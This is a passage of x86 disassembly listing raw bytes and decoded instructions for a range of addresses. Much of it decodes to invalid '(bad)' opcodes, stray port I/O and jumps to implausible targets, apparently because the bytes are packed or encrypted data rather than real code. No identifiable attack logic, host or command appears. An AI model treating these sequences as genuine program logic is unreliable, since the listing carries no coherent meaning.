  405788:	d1 51 cb             	rcll   -0x35(%ecx)
  40578b:	75 ca                	jne    0x405757
  40578d:	51                   	push   %ecx
  40578e:	dc 25 d5 5a 66 ca    	fsubl  0xca665ad5
  405794:	45                   	inc    %ebp
  405795:	9b                   	fwait
  405796:	d5 36                	aad    $0x36
  405798:	b1 e5                	mov    $0xe5,%cl
  40579a:	54                   	push   %esp
  40579b:	db d0                	fcmovnbe %st(0),%st
  40579d:	81 4e ca 00 00 00 00 	orl    $0x0,-0x36(%esi)
	...
  4057c8:	00 00                	add    %al,(%eax)
  4057ca:	b7 15                	mov    $0x15,%bh
  4057cc:	41                   	inc    %ecx
  4057cd:	86 1b                	xchg   %bl,(%ebx)
  4057cf:	73 e9                	jae    0x4057ba
  4057d1:	4f                   	dec    %edi
  4057d2:	fc                   	cld
  4057d3:	dd ac cf ee 6f b4 c7 	(bad)  -0x384b9012(%edi,%ecx,8)
  4057da:	96                   	xchg   %eax,%esi
  4057db:	b9 44 03 3e d6       	mov    $0xd63e0344,%ecx
  4057e0:	29 4b 2c             	sub    %ecx,0x2c(%ebx)
  4057e3:	70 9c                	jo     0x405781
  4057e5:	cf                   	iret
  4057e6:	56                   	push   %esi
  4057e7:	e5 2c                	in     $0x2c,%eax
  4057e9:	03 3e                	add    (%esi),%edi
  4057eb:	64 29 4f 20          	sub    %ecx,%fs:0x20(%edi)
  4057ef:	0b fe                	or     %esi,%edi
  4057f1:	4f                   	dec    %edi
  4057f2:	56                   	push   %esi
  4057f3:	82 4a d4 49          	orb    $0x49,-0x2c(%edx)
  4057f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f8:	62 ab e6 6f 5c cc    	bound  %ebp,-0x33a3901a(%ebx)
  4057fe:	8d 0b                	lea    (%ebx),%ecx
  405800:	d1 b7 2f 6f d6 c9    	shll   -0x362990d1(%edi)
  405806:	b3 67                	mov    $0x67,%bl
  405808:	c1 2b 02             	shrl   $0x2,(%ebx)
  40580b:	5c                   	pop    %esp
  40580c:	e9 7c 83 5f be       	jmp    0xbe9fdb8d
  405811:	4f                   	dec    %edi
  405812:	16                   	push   %ss
  405813:	df e9                	fucomip %st(1),%st
  405815:	db 94 6c ae c9 01 e9 	fistl  -0x16fe3652(%esp,%ebp,2)
  40581c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40581d:	dc df                	(bad)
  40581f:	83 9e c9 c5 9a 32 bb 	sbbl   $0xffffffbb,0x329ac5c9(%esi)
  405826:	fc                   	cld
  405827:	63 e9                	arpl   %bp,%cx
  405829:	2e b5 7f             	cs mov $0x7f,%ch
  40582c:	1e                   	push   %ds
  40582d:	7d 00                	jge    0x40582f
	...
  405857:	00 5b 63             	add    %bl,0x63(%ebx)
  40585a:	92                   	xchg   %eax,%edx
  40585b:	f3 68 82 00 ef 4b    	repz push $0x4bef0082
  405861:	16                   	push   %ss
  405862:	01 61 3f             	add    %esp,0x3f(%ecx)
  405865:	16                   	push   %ss
  405866:	80 26 42             	andb   $0x42,(%esi)
  405869:	e8 f4 be 76 16       	call   0x16b71762
  40586e:	80 16 62             	adcb   $0x62,(%esi)
  405871:	e7 e9                	out    %eax,$0xe9
  405873:	69 37 60 74 4c c2    	imul   $0xc24c7460,(%edi),%esi
  405879:	2e 0a b5 9d db 3f e0 	or     %cs:-0x1fc02463(%ebp),%dh
  405880:	f9                   	stc
  405881:	91                   	xchg   %eax,%ecx
  405882:	8b ac 85 6d 75 f1 95 	mov    -0x6a0e8a93(%ebp,%eax,4),%ebp
  405889:	73 db                	jae    0x405866
  40588b:	e9 3d da f8 e9       	jmp    0xea3932cd
  405890:	0f 36                	(bad)
  405892:	80 8d 35 6e 20 7d 68 	orb    $0x68,0x7d206e35(%ebp)
  405899:	ee                   	out    %al,(%dx)
  40589a:	7b c1                	jnp    0x40585d
  40589c:	86 60 74             	xchg   %ah,0x74(%eax)
  40589f:	e7 bd                	out    %eax,$0xbd
  4058a1:	ef                   	out    %eax,(%dx)
  4058a2:	37                   	aaa
  4058a3:	ee                   	out    %al,(%dx)
  4058a4:	43                   	inc    %ebx
  4058a5:	ea 06 69 81 33 ff f0 	ljmp   $0xf0ff,$0x33816906
  4058ac:	80 56 c6 2d          	adcb   $0x2d,-0x3a(%esi)
  4058b0:	3a 6e 00             	cmp    0x0(%esi),%ch
  4058b3:	c2 3b 82             	ret    $0x823b
  4058b6:	02 d2                	add    %dl,%dl
  4058b8:	d1 0d c9 ab 00 00    	rorl   0xabc9
	...
  4058e6:	11 6e 54             	adc    %ebp,0x54(%esi)
  4058e9:	62 f1                	(bad)
  4058eb:	d9 c4                	fld    %st(4)
  4058ed:	c5 4a da             	lds    -0x26(%edx),%ecx
  4058f0:	3d 22 3b 1c 00       	cmp    $0x1c3b22,%eax
  4058f5:	e9 81 49 83 d4       	jmp    0xd4c3a27b
  4058fa:	76 22                	jbe    0x40591e
  4058fc:	41                   	inc    %ecx
  4058fd:	e9 3d e7 08 00       	jmp    0x49403f
  405902:	64 55                	fs push %ebp
  405904:	67 4b                	addr16 dec %ebx
  405906:	26 57                	es push %edi
  405908:	00 75 d8             	add    %dh,-0x28(%ebp)
  40590b:	4e                   	dec    %esi
  40590c:	c0 5b 9e 97          	rcrb   $0x97,-0x62(%ebx)
  405910:	08 00                	or     %al,(%eax)
  405912:	4c                   	dec    %esp
  405913:	c0 c7 45             	rol    $0x45,%bh
  405916:	0b 5a 00             	or     0x0(%edx),%ebx
  405919:	00 97 e4 44 f8 e7    	add    %dl,-0x1807bb1c(%edi)
  40591f:	a2 75 08 6d 59       	mov    %al,0x596d0875
  405924:	ff 15 7c 2e 41 00    	call   *0x412e7c
  40592a:	9c                   	pushf
  40592b:	99                   	cltd
  40592c:	74 5b                	je     0x405989
  40592e:	ff 90 db 00 67 ee    	call   *-0x1198ff25(%eax)
  405934:	cf                   	iret
  405935:	8d 9a 9d 50 6a 77    	lea    0x776a509d(%edx),%ebx
  40593b:	27                   	daa
  40593c:	ff 15 b8 2e 41 00    	call   *0x412eb8
  405942:	4c                   	dec    %esp
  405943:	99                   	cltd
  405944:	74 29                	je     0x40596f
  405946:	18 2d e4 01 00 00    	sbb    %ch,0x1e4
	...
  405974:	57                   	push   %edi
  405975:	59                   	pop    %ecx
  405976:	00 ff                	add    %bh,%bh
  405978:	ca a1 8f             	lret   $0x8fa1
  40597b:	45                   	inc    %ebp
  40597c:	0f 95 75 fc          	setne  -0x4(%ebp)
  405980:	a0 1a ec 83 92       	mov    0x9283ec1a,%al
  405985:	73 ff                	jae    0x405986
  405987:	73 1e                	jae    0x4059a7
  405989:	ae                   	scas   %es:(%edi),%al
  40598a:	45                   	inc    %ebp
  40598b:	f0 25 59 00 00 ec    	lock and $0xec000059,%eax
  405991:	6c                   	insb   (%dx),%es:(%edi)
  405992:	c6 45 c7 57          	movb   $0x57,-0x39(%ebp)
  405996:	00 00                	add    %al,(%eax)
  405998:	17                   	pop    %ss
  405999:	13 00                	adc    (%eax),%eax
  40599b:	6a e7                	push   $0xffffffe7
  40599d:	12 10                	adc    (%eax),%dl
  40599f:	8d 1a                	lea    (%edx),%ebx
  4059a1:	7b 50                	jnp    0x4059f3
  4059a3:	6a 3e                	push   $0x3e
  4059a5:	82 c6 75             	add    $0x75,%dh
  4059a8:	ea dd f1 7e 85 43 04 	ljmp   $0x443,$0x857ef1dd
  4059af:	0b fe                	or     %esi,%edi
  4059b1:	66 04 43             	data16 add $0x43,%al
  4059b4:	bd 67 cf 00 4a       	mov    $0x4a00cf67,%ebp
  4059b9:	7a c6                	jp     0x405981
  4059bb:	75 b2                	jne    0x40596f
  4059bd:	0a f9                	or     %cl,%bh
  4059bf:	da 3e                	fidivrl (%esi)
  4059c1:	82 7a c3 05          	cmpb   $0x5,-0x3d(%edx)
  4059c5:	3b c2                	cmp    %edx,%eax
  4059c7:	08 3e                	or     %bh,(%esi)
  4059c9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4059ca:	7a ec                	jp     0x4059b8
  4059cc:	99                   	cltd
  4059cd:	af                   	scas   %es:(%edi),%eax
  4059ce:	fb                   	sti
  4059cf:	e7 39                	out    %eax,$0x39
  4059d1:	39 04 00             	cmp    %eax,(%eax,%eax,1)
  4059d4:	fe                   	(bad)
  4059d5:	d1 db                	rcr    %ebx
  4059d7:	41                   	inc    %ecx
	...
  405a00:	00 00                	add    %al,(%eax)
  405a02:	8e 3d c7 50 79 cf    	mov    0xcf7950c7,%?
  405a08:	fb                   	sti
  405a09:	4f                   	dec    %edi
  405a0a:	66 66 aa             	data16 data16 stos %al,%es:(%edi)
  405a0d:	00 3e                	add    %bh,(%esi)
  405a0f:	aa                   	stos   %al,%es:(%edi)
  405a10:	bc c2 3a 82 30       	mov    $0x30823ac2,%esp
  405a15:	8b 6a 01             	mov    0x1(%edx),%ebp
  405a18:	c0 fc ed             	sar    $0xed,%ah
  405a1b:	00 49 08             	add    %cl,0x8(%ecx)
  405a1e:	3e ef                	ds out %eax,(%dx)
  405a20:	fd                   	std
  405a21:	2a 7e c9             	sub    -0x37(%esi),%bh
  405a24:	bc c2 46 82 1a       	mov    $0x1a8246c2,%esp
  405a29:	db a4 82 59 00 94 82 	(bad)  -0x7d6bffa7(%edx,%eax,4)
  405a30:	59                   	pop    %ecx
  405a31:	00 21                	add    %ah,(%ecx)
  405a33:	07                   	pop    %es
  405a34:	f8                   	clc
  405a35:	fe                   	(bad)
  405a36:	93                   	xchg   %eax,%ebx
  405a37:	6a 59                	push   $0x59
  405a39:	00 a4 82 db 36 e5 81 	add    %ah,-0x7e1ac925(%edx,%eax,4)
  405a40:	03 0b                	add    (%ebx),%ecx
  405a42:	fe                   	(bad)
  405a43:	25 10 89 83 5b       	and    $0x5b838910,%eax
  405a48:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405a49:	c6                   	(bad)
  405a4a:	6b 6f 91 cd          	imul   $0xffffffcd,-0x6f(%edi),%ebp
  405a4e:	d9 6b 96             	fldcw  -0x6a(%ebx)
  405a51:	fa                   	cli
  405a52:	a1 e6 c3 7a f6       	mov    0xf67ac3e6,%eax
  405a57:	00 e9                	add    %ch,%cl
  405a59:	59                   	pop    %ecx
  405a5a:	3e 6c                	ds insb (%dx),%es:(%edi)
  405a5c:	f4                   	hlt
  405a5d:	c7                   	(bad)
  405a5e:	6d                   	insl   (%dx),%es:(%edi)
  405a5f:	6c                   	insb   (%dx),%es:(%edi)
  405a60:	fc                   	cld
  405a61:	f7 c0 e5 e0 59 00    	test   $0x59e0e5,%eax
	...
  405a8f:	00 3e                	add    %bh,(%esi)
  405a91:	01 e9                	add    %ebp,%ecx
  405a93:	db 44 90 e9          	fildl  -0x17(%eax,%edx,4)
  405a97:	03 35 9b dc fb 0c    	add    0xcfbdc9b,%esi
  405a9d:	83 91 d6 99 6b 12 ab 	adcl   $0xffffffab,0x126b99d6(%ecx)
  405aa4:	c5 97 a2 bc 7c 62    	lds    0x627cbca2(%edi),%edx
  405aaa:	e9 30 b5 7e c3       	jmp    0xc3bf0fdf
  405aaf:	c6                   	(bad)
  405ab0:	79 e5                	jns    0x405a97
  405ab2:	f0 db b9 6b 1e c6 77 	lock fstpt 0x77c61e6b(%ecx)
  405ab9:	98                   	cwtl
  405aba:	ed                   	in     (%dx),%eax
  405abb:	03 0b                	add    (%ebx),%ecx
  405abd:	e0 fd                	loopne 0x405abc
  405abf:	81 db 5e e9 4f 38    	sbb    $0x384fe95e,%ebx
  405ac5:	d8 7c fb 49          	fdivrs 0x49(%ebx,%edi,8)
  405ac9:	e6 ee                	out    %al,$0xee
  405acb:	1a 7e a1             	sbb    -0x5f(%esi),%bh
  405ace:	2b fb                	sub    %ebx,%edi
  405ad0:	39 f5                	cmp    %esi,%ebp
  405ad2:	e8 c4 ab 57 de       	call   0xde98069b
  405ad7:	4f                   	dec    %edi
  405ad8:	36 73 af             	ss jae 0x405a8a
  405adb:	a9 3e 5b e2 c3       	test   $0xc3e25b3e,%eax
  405ae0:	92                   	xchg   %eax,%edx
  405ae1:	4b                   	dec    %ebx
  405ae2:	98                   	cwtl
  405ae3:	57                   	push   %edi
  405ae4:	42                   	inc    %edx
  405ae5:	6a 34                	push   $0x34
  405ae7:	f8                   	clc
  405ae8:	08 f1                	or     %dh,%cl
  405aea:	ff e0                	jmp    *%eax
  405aec:	e5 1a                	in     $0x1a,%eax
  405aee:	ff ae 03 77 18 72    	ljmp   *0x72187703(%esi)
	...
  405b1c:	00 00                	add    %al,(%eax)
  405b1e:	31 57 40             	xor    %edx,0x40(%edi)
  405b21:	39 0a                	cmp    %ecx,(%edx)
  405b23:	f1                   	int1
  405b24:	ee                   	out    %al,(%dx)
  405b25:	96                   	xchg   %eax,%esi
  405b26:	fb                   	sti
  405b27:	0b ff                	or     %edi,%edi
  405b29:	14 d6                	adc    $0xd6,%al
  405b2b:	1a ff                	sbb    %bh,%bh
  405b2d:	fc                   	cld
  405b2e:	d5 82                	aad    $0x82
  405b30:	9f                   	lahf
  405b31:	8e 03                	mov    (%ebx),%es
  405b33:	6b 58 a0 fc          	imul   $0xfffffffc,-0x60(%eax),%ebx
  405b37:	53                   	push   %ebx
  405b38:	00 14 37             	add    %dl,(%edi,%esi,1)
  405b3b:	77 56                	ja     0x405b93
  405b3d:	be 6e de 7d f1       	mov    $0xf17dde6e,%esi
  405b42:	3d f0 08 02 7a       	cmp    $0x7a0208f0,%eax
  405b47:	06                   	push   %es
  405b48:	5f                   	pop    %edi
  405b49:	af                   	scas   %es:(%edi),%eax
  405b4a:	d4 9d                	aam    $0x9d
  405b4c:	08 e9                	or     %ch,%cl
  405b4e:	16                   	push   %ss
  405b4f:	20 0c 6a             	and    %cl,(%edx,%ebp,2)
  405b52:	a2 5c 0b 29 ee       	mov    %al,0xee290b5c
  405b57:	53                   	push   %ebx
  405b58:	2b 29                	sub    (%ecx),%ebp
  405b5a:	27                   	daa
  405b5b:	0a 5e 30             	or     0x30(%esi),%bl
  405b5e:	7c 53                	jl     0x405bb3
  405b60:	00 72 21             	add    %dh,0x21(%edx)
  405b63:	57                   	push   %edi
  405b64:	8b 9c 65 d5 fe 02 07 	mov    0x702fed5(%ebp,%eiz,2),%ebx
  405b6b:	01 8b ef bd 67 30    	add    %ecx,0x3067bdef(%ebx)
  405b71:	7b 47                	jnp    0x405bba
  405b73:	ea fb b0 f2 5f 80 fd 	ljmp   $0xfd80,$0x5ff2b0fb
  405b7a:	4d                   	dec    %ebp
  405b7b:	76 2d                	jbe    0x405baa
  405b7d:	69 f9 1b 72 ec 00    	imul   $0xec721b,%ecx,%edi
	...
  405bab:	00 bd 66 46 5e 22    	add    %bh,0x225e4666(%ebp)
  405bb1:	ea eb 28 c2 9e 0a 00 	ljmp   $0xa,$0x9ec228eb
  405bb8:	ec                   	in     (%dx),%al
  405bb9:	72 7f                	jb     0x405c3a
  405bbb:	fc                   	cld
  405bbc:	76 0d                	jbe    0x405bcb
  405bbe:	0d 80 cb 07 77       	or     $0x7707cb80,%eax
  405bc3:	08 67 92             	or     %ah,-0x6e(%edi)
  405bc6:	61                   	popa
  405bc7:	80 a3 63 ea 09 0c 9e 	andb   $0x9e,0xc09ea63(%ebx)
  405bce:	5b                   	pop    %ebx
  405bcf:	5f                   	pop    %edi
  405bd0:	29 a6 c2 08 e7 61    	sub    %esp,0x61e708c2(%esi)
  405bd6:	30 72 cf             	xor    %dh,-0x31(%edx)
  405bd9:	61                   	popa
  405bda:	39 77 e3             	cmp    %esi,-0x1d(%edi)
  405bdd:	51                   	push   %ecx
  405bde:	30 eb                	xor    %ch,%bl
  405be0:	f2 61                	repnz popa
  405be2:	41                   	inc    %ecx
  405be3:	72 9d                	jb     0x405b82
  405be5:	61                   	popa
  405be6:	46                   	inc    %esi
  405be7:	77 a1                	ja     0x405b8a
  405be9:	51                   	push   %ecx
  405bea:	41                   	inc    %ecx
  405beb:	04 ad                	add    $0xad,%al
  405bed:	82 17 3c             	adcb   $0x3c,(%edi)
  405bf0:	76 0b                	jbe    0x405bfd
  405bf2:	0a 3c 81             	or     (%ecx,%eax,4),%bh
  405bf5:	16                   	push   %ss
  405bf6:	06                   	push   %es
  405bf7:	2c 86                	sub    $0x86,%al
  405bf9:	69 09 eb 8e 42 c0    	imul   $0xc0428eeb,(%ecx),%ecx
  405bff:	5b                   	pop    %ebx
  405c00:	a8 3f                	test   $0x3f,%al
  405c02:	c9                   	leave
  405c03:	c2 5f 5d             	ret    $0x5d5f
  405c06:	c0 e0 63             	shl    $0x63,%al
  405c09:	63 c3                	arpl   %ax,%bx
  405c0b:	aa                   	stos   %al,%es:(%edi)
  405c0c:	ac                   	lods   %ds:(%esi),%al
  405c0d:	22 83 c6 00 00 00    	and    0xc6(%ebx),%al
	...
  405c37:	00 00                	add    %al,(%eax)
  405c39:	00 55 62             	add    %dl,0x62(%ebp)
  405c3c:	da 75 e6             	fidivl -0x1a(%ebp)
  405c3f:	d5 01                	aad    $0x1
  405c41:	00 67 5d             	add    %ah,0x5d(%edi)
  405c44:	5b                   	pop    %ebx
  405c45:	5f                   	pop    %edi
  405c46:	a9 a4 c2 08 57       	test   $0x5708c2a4,%eax
  405c4b:	36 53                	ss push %ebx
  405c4d:	50                   	push   %eax
  405c4e:	cf                   	iret
  405c4f:	04 1f                	add    $0x1f,%al
  405c51:	2a 67 5f             	sub    0x5f(%edi),%ah
  405c54:	f8                   	clc
  405c55:	72 16                	jb     0x405c6d
  405c57:	a2 ff bb 3e 73       	mov    %al,0x733ebbff
  405c5c:	03 00                	add    (%eax),%eax
  405c5e:	3e d9 2c 4d 7f 72 2d 	fldcw  %ds:0x12d727f(,%ecx,2)
  405c65:	01 
  405c66:	71 8a                	jno    0x405bf2
  405c68:	42                   	inc    %edx
  405c69:	fd                   	std
  405c6a:	01 b2 e7 d7 fa 65    	add    %esi,0x65fad7e7(%edx)
  405c70:	c3                   	ret
  405c71:	b9 f1 c1 c3 ff       	mov    $0xffc3c1f1,%ecx
  405c76:	ec                   	in     (%dx),%al
  405c77:	18 fc                	sbb    %bh,%ah
  405c79:	06                   	push   %es
  405c7a:	6b da 8f             	imul   $0xffffff8f,%edx,%ebx
  405c7d:	c3                   	ret
  405c7e:	75 39                	jne    0x405cb9
  405c80:	c7                   	(bad)
  405c81:	55                   	push   %ebp
  405c82:	c5 ce 87             	(bad)
  405c85:	c4                   	(bad)
  405c86:	ce                   	into
  405c87:	45                   	inc    %ebp
  405c88:	54                   	push   %esp
  405c89:	58                   	pop    %eax
  405c8a:	56                   	push   %esi
  405c8b:	4b                   	dec    %ebx
  405c8c:	ee                   	out    %al,(%dx)
  405c8d:	3f                   	aas
  405c8e:	3e ea 35 01 7d 01 87 	ds ljmp $0x3d87,$0x17d0135
  405c95:	3d 
  405c96:	21 ad 44 00 3e 86    	and    %ebp,-0x79c1ffbc(%ebp)
  405c9c:	15 83 00 00 00       	adc    $0x83,%eax
	...
  405cc5:	00 00                	add    %al,(%eax)
  405cc7:	00 5b a9             	add    %bl,-0x57(%ebx)
  405cca:	4e                   	dec    %esi
  405ccb:	41                   	inc    %ecx
  405ccc:	3e 72 37             	jb,pt  0x405d06
  405ccf:	09 bd 67 36 4b ff    	or     %edi,-0xb4c999(%ebp)
  405cd5:	71 03                	jno    0x405cda
  405cd7:	75 43                	jne    0x405d1c
  405cd9:	5d                   	pop    %ebp
  405cda:	c4 5b 87             	les    -0x79(%ebx),%ebx
  405cdd:	35 ef da 56 d4       	xor    $0xd456daef,%eax
  405ce2:	dc 00                	faddl  (%eax)
  405ce4:	3e ff 58 fc          	lcall  *%ds:-0x4(%eax)
  405ce8:	ec                   	in     (%dx),%al
  405ce9:	db 0b                	fisttpl (%ebx)
  405ceb:	50                   	push   %eax
  405cec:	51                   	push   %ecx
  405ced:	87 2a                	xchg   %ebp,(%edx)
  405cef:	4b                   	dec    %ebx
  405cf0:	ff 71 0e             	push   0xe(%ecx)
  405cf3:	c0 31 f6             	shlb   $0xf6,(%ecx)
  405cf6:	93                   	xchg   %eax,%ebx
  405cf7:	00 3e                	add    %bh,(%esi)
  405cf9:	72 ca                	jb     0x405cc5
  405cfb:	45                   	inc    %ebp
  405cfc:	36 5b                	ss pop %ebx
  405cfe:	e9 03 3e 5b 6c       	jmp    0x6c9b9b06
  405d03:	48                   	dec    %eax
  405d04:	26 0b 43 04          	or     %es:0x4(%ebx),%eax
  405d08:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405d09:	5b                   	pop    %ebx
  405d0a:	43                   	inc    %ebx
  405d0b:	05 11 ee c4 c2       	add    $0xc2c4ee11,%eax
  405d10:	33 f8                	xor    %eax,%edi
  405d12:	31 45 3e             	xor    %eax,0x3e(%ebp)
  405d15:	54                   	push   %esp
  405d16:	a9 38 64 73 f7       	test   $0xf7736438,%eax
  405d1b:	dc 3e                	fdivrl (%esi)
  405d1d:	5b                   	pop    %ebx
  405d1e:	6a bb                	push   $0xffffffbb
  405d20:	64 ee                	fs out %al,(%dx)
  405d22:	08 87 63 63 e9 37    	or     %al,0x37e96363(%edi)
  405d28:	74 68                	je     0x405d92
  405d2a:	14 bc                	adc    $0xbc,%al
	...
  405d54:	00 00                	add    %al,(%eax)
  405d56:	e6 76                	out    %al,$0x76
  405d58:	94                   	xchg   %eax,%esp
  405d59:	c2 c9 d1             	ret    $0xd1c9
  405d5c:	24 b8                	and    $0xb8,%al
  405d5e:	b3 1d                	mov    $0x1d,%bl
  405d60:	71 53                	jno    0x405db5
  405d62:	b9 ed 70 c2 2b       	mov    $0x2bc270ed,%ecx
  405d67:	6f                   	outsl  %ds:(%esi),(%dx)
  405d68:	d3 04 a9             	roll   %cl,(%ecx,%ebp,4)
  405d6b:	ed                   	in     (%dx),%eax
  405d6c:	5c                   	pop    %esp
  405d6d:	c2 4b f8             	ret    $0xf84b
  405d70:	a1 44 3e 54 29       	mov    0x29543e44,%eax
  405d75:	37                   	aaa
  405d76:	60                   	pusha
  405d77:	d4 ac                	aam    $0xac
  405d79:	b7 b5                	mov    $0xb5,%bh
  405d7b:	4a                   	dec    %edx
  405d7c:	6c                   	insb   (%dx),%es:(%edi)
  405d7d:	48                   	dec    %eax
  405d7e:	8e 0a                	mov    (%edx),%cs
  405d80:	9b                   	fwait
  405d81:	c2 53 ec             	ret    $0xec53
  405d84:	a1 44 3e 54 29       	mov    0x29543e44,%eax
  405d89:	37                   	aaa
  405d8a:	44                   	inc    %esp
  405d8b:	f3 c1 50 ff 5a       	repz rcll $0x5a,-0x1(%eax)
  405d90:	16                   	push   %ss
  405d91:	38 4e 72             	cmp    %cl,0x72(%esi)
  405d94:	fd                   	std
  405d95:	da 3e                	fidivrl (%esi)
  405d97:	5b                   	pop    %ebx
  405d98:	f2 c3                	bnd ret
  405d9a:	d3 59 aa             	rcrl   %cl,-0x56(%ecx)
  405d9d:	c2 cb 6a             	ret    $0x6acb
  405da0:	00 01                	add    %al,(%ecx)
  405da2:	70 83                	jo     0x405d27
  405da4:	00 e9                	add    %ch,%cl
  405da6:	fc                   	cld
  405da7:	f0 f3 d1 c3          	lock repz rol %ebx
  405dab:	78 ff                	js     0x405dac
  405dad:	de ff                	fdivrp %st,%st(7)
  405daf:	f0 fb                	lock sti
  405db1:	c1 81 83 00 e9 c2 9a 	roll   $0x9a,-0x3d16ff7d(%ecx)
  405db8:	5b                   	pop    %ebx
  405db9:	b0 00                	mov    $0x0,%al
	...
  405de3:	00 03                	add    %al,(%ebx)
  405de5:	11 8b cd bd 9f c0    	adc    %ecx,-0x3f604233(%ebx)
  405deb:	b7 ff                	mov    $0xff,%bh
  405ded:	66 53                	push   %bx
  405def:	19 92 f3 3f d2 7d    	sbb    %edx,0x7dd23ff3(%edx)
  405df5:	5b                   	pop    %ebx
  405df6:	f8                   	clc
  405df7:	1b 3d 9a ff 6a d9    	sbb    0xd96aff9a,%edi
  405dfd:	31 4b 28             	xor    %ecx,0x28(%ebx)
  405e00:	3a 5b 74             	cmp    0x74(%ebx),%bl
  405e03:	e2 c2                	loop   0x405dc7
  405e05:	28 2f                	sub    %ch,(%edi)
  405e07:	32 7d 5b             	xor    0x5b(%ebp),%bh
  405e0a:	00 fd                	add    %bh,%ch
  405e0c:	53                   	push   %ebx
  405e0d:	da 3d 06 03 1c 00    	fidivrl 0x1c0306
  405e13:	e9 71 54 83 1c       	jmp    0x1cc3b289
  405e18:	53                   	push   %ebx
  405e19:	12 41 e9             	adc    -0x17(%ecx),%al
  405e1c:	3d f0 04 02 7a       	cmp    $0x7a0204f0,%eax
  405e21:	02 c9                	add    %cl,%cl
  405e23:	2a 9b 81 ff d4 92    	sub    -0x6d2b007f(%ebx),%bl
  405e29:	11 41 e9             	adc    %eax,-0x17(%ecx)
  405e2c:	c4 20                	les    (%eax),%esp
  405e2e:	f4                   	hlt
  405e2f:	26 b9 97 fe 26 7f    	es mov $0x7f26fe97,%ecx
  405e35:	33 01                	xor    (%ecx),%eax
  405e37:	e9 3d f1 ff 82       	jmp    0x83404f79
  405e3c:	43                   	inc    %ebx
  405e3d:	73 73                	jae    0x405eb2
  405e3f:	31 3a                	xor    %edi,(%edx)
  405e41:	5b                   	pop    %ebx
  405e42:	83 00 3f             	addl   $0x3f,(%eax)
  405e45:	9c                   	pushf
  405e46:	0f 84 00 00 00 00    	je     0x405e4c
	...
  405e70:	00 00                	add    %al,(%eax)
  405e72:	61                   	popa
  405e73:	59                   	pop    %ecx
  405e74:	00 00                	add    %al,(%eax)
  405e76:	9e                   	sahf
  405e77:	de c8                	fmulp  %st,%st(0)
  405e79:	fe                   	(bad)
  405e7a:	20 9b 8d 85 f3 9b    	and    %bl,-0x640c7a73(%ebx)
  405e80:	ff                   	(bad)
  405e81:	ff 67 9c             	jmp    *-0x64(%edi)
  405e84:	b5 c8                	mov    $0xc8,%ch
  405e86:	f1                   	int1
  405e87:	9a ff e8 4f 87 00 00 	lcall  $0x0,$0x874fe8ff
  405e8e:	0c 9a                	or     $0x9a,%al
  405e90:	0f 84 c4 59 00 00    	je     0x40b85a
  405e96:	7f 09                	jg     0x405ea1
  405e98:	4d                   	dec    %ebp
  405e99:	41                   	inc    %ecx
  405e9a:	e7 d4                	out    %eax,$0xd4
  405e9c:	85 f0                	test   %esi,%eax
  405e9e:	a1 9a ff 50 cf       	mov    0xcf50ff9a,%eax
  405ea3:	0e                   	push   %cs
  405ea4:	d9 00                	flds   (%eax)
  405ea6:	e7 56                	out    %eax,$0x56
  405ea8:	c0 0f 5b             	rorb   $0x5b,(%edi)
  405eab:	9f                   	lahf
  405eac:	00 00                	add    %al,(%eax)
  405eae:	d7                   	xlat   %ds:(%ebx)
  405eaf:	92                   	xchg   %eax,%edx
  405eb0:	85 c4                	test   %eax,%esp
  405eb2:	41                   	inc    %ecx
  405eb3:	9b                   	fwait
  405eb4:	ff 00                	incl   (%eax)
  405eb6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405eb7:	59                   	pop    %ecx
  405eb8:	00 8d 1a 9e fe ff    	add    %cl,-0x161e6(%ebp)
  405ebe:	20 0a                	and    %cl,(%edx)
  405ec0:	ff b5 6b 9c ff ff    	push   -0x6395(%ebp)
  405ec6:	f0 4c                	lock dec %esp
  405ec8:	2f                   	das
  405ec9:	4b                   	dec    %ebx
  405eca:	e6 59                	out    %al,$0x59
  405ecc:	8b 95 5b 9c ff ff    	mov    -0x63a5(%ebp),%edx
  405ed2:	8c 99 0f 84 00 00    	mov    %ds,0x840f(%ecx)
	...
  405f00:	0f 5a 00             	cvtps2pd (%eax),%xmm0
  405f03:	00 6c 0c f4          	add    %ch,-0xc(%esp,%ecx,1)
  405f07:	0f da ca             	pminub %mm2,%mm1
  405f0a:	00 00                	add    %al,(%eax)
  405f0c:	57                   	push   %edi
  405f0d:	9a b5 d4 3e 4e c0 ff 	lcall  $0xffc0,$0x4e3ed4b5
  405f14:	e4 73                	in     $0x73,%al
  405f16:	2b 00                	sub    (%eax),%eax
  405f18:	3e 74 05             	je,pt  0x405f20
  405f1b:	e8 49 4c 03 00       	call   0x43ab69
  405f20:	45                   	inc    %ebp
  405f21:	32 37                	xor    (%edi),%dh
  405f23:	79 c7                	jns    0x405eec
  405f25:	bf bb 8d 83 7e       	mov    $0x7e838dbb,%edi
  405f2a:	54                   	push   %esp
  405f2b:	68 15 74 01 00       	push   $0x17415
  405f30:	19 08                	sbb    %ecx,(%eax)
  405f32:	bc ff 2b 1d 4b       	mov    $0x4b1d2bff,%esp
  405f37:	41                   	inc    %ecx
  405f38:	3e 69 c3 74 66 a5 39 	ds imul $0x39a56674,%ebx,%eax
  405f3f:	fc                   	cld
  405f40:	f9                   	stc
  405f41:	87 2a                	xchg   %ebp,(%edx)
  405f43:	4b                   	dec    %ebx
  405f44:	7f 72                	jg     0x405fb8
  405f46:	0a c0                	or     %al,%al
  405f48:	72 7b                	jb     0x405fc5
  405f4a:	42                   	inc    %edx
  405f4b:	c7                   	(bad)
  405f4c:	bb b2 be ff d9       	mov    $0xd9ffbeb2,%ebx
  405f51:	72 03                	jb     0x405f56
  405f53:	00 3e                	add    %bh,(%esi)
  405f55:	07                   	pop    %es
  405f56:	89 c0                	mov    %eax,%eax
  405f58:	c8 dd bf 50          	enter  $0xbfdd,$0x50
  405f5c:	56                   	push   %esi
  405f5d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405f5e:	03 0f                	add    (%edi),%ecx
  405f60:	3e da 9b d8 00 00 00 	ficompl %ds:0xd8(%ebx)
	...
  405f8b:	00 00                	add    %al,(%eax)
  405f8d:	00 3e                	add    %bh,(%esi)
  405f8f:	72 0a                	jb     0x405f9b
  405f91:	c0 33 67             	shlb   $0x67,(%ebx)
